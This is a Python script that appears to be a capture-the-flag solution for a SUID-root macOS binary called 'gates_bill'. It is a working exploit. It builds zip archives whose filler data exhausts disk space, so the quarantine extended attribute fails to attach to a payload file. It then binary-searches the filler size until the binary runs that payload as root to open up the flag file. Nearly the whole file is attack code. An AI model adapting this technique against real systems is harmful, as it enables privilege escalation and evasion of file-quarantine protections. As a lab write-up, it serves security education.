#!/usr/bin/env python3
#
#  Solution
#  --------
#  1. The "gates_bill" binary creates a 1 GB APFS disk image and extracts our zip into it.
#  2. After extraction it stamps every file with a "com.apple.quarantine" xattr (flags "0005").
#  3. It then runs "/Users/ctf/mnt/entry" only if that file has no quarantine attribute.
#  4. The critical bug: setxattr() return values are silently ignored.
#  5. Thus, we fill the disk completely (using binary search to calibrate) and find the "sweet spot".
#
import os
import stat
import subprocess
import zipfile

# Fine tunables
GATES_BILL = '/Users/ctf/gates_bill'
OUTPUT_ZIP = '/tmp/exploit_probe.zip'
FLAG_PATH = '/Users/ctf/flag'

# Initial low and high values for binary search
BLOCKS_LO = 200000
BLOCKS_HI = 270000

# Number of "pre-files"
PRE_FILES = 50

# Shell script run as root (gates_bill is SUID root)
ENTRY_SCRIPT = f'''#!/bin/bash
chmod 755 {FLAG_PATH}
'''

# Markers
MARKER_TOO_SMALL = 1
MARKER_TOO_BIG = 2

def create_exploit_zip(output:str, filler_blocks:int, pre_files:int):
    """
        Build the exploit zip.
    """

    # Build the zipfile
    with zipfile.ZipFile(output, 'w', allowZip64=True) as zf:

        # Root-level pre-files ("a" prefix → visited before "entry" by nftw)
        for i in range(pre_files):
            zf.writestr(zipfile.ZipInfo(f'a{i:05d}'), b'x')

        # Payload
        entry_info = zipfile.ZipInfo('entry')
        entry_info.compress_type = zipfile.ZIP_DEFLATED
        zf.writestr(entry_info, ENTRY_SCRIPT.encode('utf8'))

        # Filler
        filler_info = zipfile.ZipInfo('filler.bin')
        filler_info.compress_type = zipfile.ZIP_DEFLATED
        chunk = b'\xAA' * (4 * 1024 * 1024)
        remaining = filler_blocks * 4096

        # Write file
        with zf.open(filler_info, 'w') as fout:
            while remaining > 0:
                n = min(len(chunk), remaining)
                fout.write(chunk[:n])
                remaining -= n


def probe(filler_blocks:int, pre_files:int):
    """
        Run the challenge with the given parameters.
        Returns one of of the markers (MARKER_TOO_SMALL, MARKER_TOO_BIG) or the contents of the flag.
    """

    # Creates the exploit zip
    create_exploit_zip(OUTPUT_ZIP, filler_blocks, pre_files)

    # Run the binary
    result = subprocess.run([GATES_BILL, OUTPUT_ZIP], capture_output=True, text=True)
    combined = result.stdout + result.stderr

    # Try to read flag
    try:
        with open(FLAG_PATH, 'r') as fp:
            return fp.read()
    except:
        pass

    # Parse output
    if 'archive_write_data_block failed' in combined or 'archive_write_header failed' in combined:
        return MARKER_TOO_BIG
    if 'you shall not pass' in combined:
        return MARKER_TOO_SMALL
    raise Exception(f'Unexpected output\n{combined}')


def solve(pre_files:int):
    """
        Binary-search filler blocks for the given pre-files count.
    """

    # Initial low and high values
    lo, hi = BLOCKS_LO, BLOCKS_HI

    # Perform binary search
    while lo <= hi:
        mid = (lo + hi) // 2
        outcome = probe(mid, pre_files)
        if isinstance(outcome, str):
            return outcome
        elif outcome == MARKER_TOO_BIG:
            hi = mid - 1
        else:
            lo = mid + 1

    # No calibration
    raise Exception('Calibration unsuccessful')

if __name__ == '__main__':

    # Solve
    print(solve(PRE_FILES))

